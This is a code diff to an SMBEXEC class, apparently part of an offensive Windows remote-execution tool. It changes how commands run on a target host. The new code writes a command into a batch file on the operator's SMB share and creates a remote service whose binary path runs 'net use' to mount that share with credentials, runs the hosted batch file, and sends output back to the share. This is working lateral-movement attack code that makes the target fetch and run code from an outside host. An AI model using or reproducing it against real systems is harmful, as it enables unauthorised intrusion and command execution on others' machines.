@@ -62,34 +62,34 @@ class SMBEXEC:
         resp = scmr.hROpenSCManagerW(self.__scmr)
         self.__scHandle = resp['lpScHandle']
 
-    def execute(self, command, output=False):
+    def execute(self, command, alea, output=False):
         self.__retOutput = output
-        self.execute_fileless(command)
+        self.execute_fileless(command, alea)
         self.finish()
         return self.__outputBuffer
 
     def output_callback(self, data):
         self.__outputBuffer += data
 
-    def execute_fileless(self, data):
+    def execute_fileless(self, data, alea):
         self.__output = gen_random_string(6)
         self.__batchFile = gen_random_string(6) + '.bat'
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         data = data.replace('&', '^&')
+        data = data.replace('ABCD', '%%')
+        data = data.replace('EFGH', '%%')
         if self.__retOutput:
-            command = self.__shell + data + ' ^> tmp\\{} ^& popd'.format(self.__output)
+            command = self.__shell + data + ' ^> \\\\{}\\{}\\tmp\\{}'.format(local_ip, alea, self.__output)
         else:
             command = self.__shell + data
-
         with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
         logging.debug('Hosting batch file with command: ' + command)
 
-        command = self.__shell + 'pushd \\\\{}@{}\\misc & tmp\\{} & popd'.format(local_ip, self.__webPort, self.__batchFile)
+        command = self.__shell + 'net use \\\\{}\\{} /persistent:no /user:{} {} & \\\\{}\\{}\\tmp\\{} & net use \\\\{}\\{} /del'.format(local_ip, alea, alea, alea, local_ip, alea, self.__batchFile, local_ip, alea)
         logging.debug('Command to execute: ' + command)
-
         logging.debug('Remote service {} created.'.format(self.__serviceName))
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
